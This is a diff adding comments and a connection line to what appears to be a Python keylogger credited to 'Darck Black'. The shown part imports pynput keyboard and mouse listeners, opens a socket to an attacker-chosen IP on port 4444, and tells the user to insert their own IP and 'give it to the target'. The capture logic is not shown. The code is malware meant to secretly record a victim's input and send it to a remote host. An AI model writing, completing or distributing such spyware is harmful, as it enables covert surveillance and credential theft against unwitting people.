@@ -1,3 +1,10 @@
+#coded by : Darck Black
+#telegram : DarkBlack36
+
+#You need to install pynput,thread,colorama,socket libraries.
+
+#On line 13 you have to enter your IP instead of IP.
+
 from pynput import keyboard , mouse 
 from _thread import start_new_thread
 from colorama import Fore , init
@@ -5,7 +12,7 @@ import socket
 init()
 
 s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-s.connect(( #enter your ip  , 4444))
+s.connect(( " IP  "  , 4444)) #You must enter your IP in the field before porting and give it to the target.
 
 #############################################
 
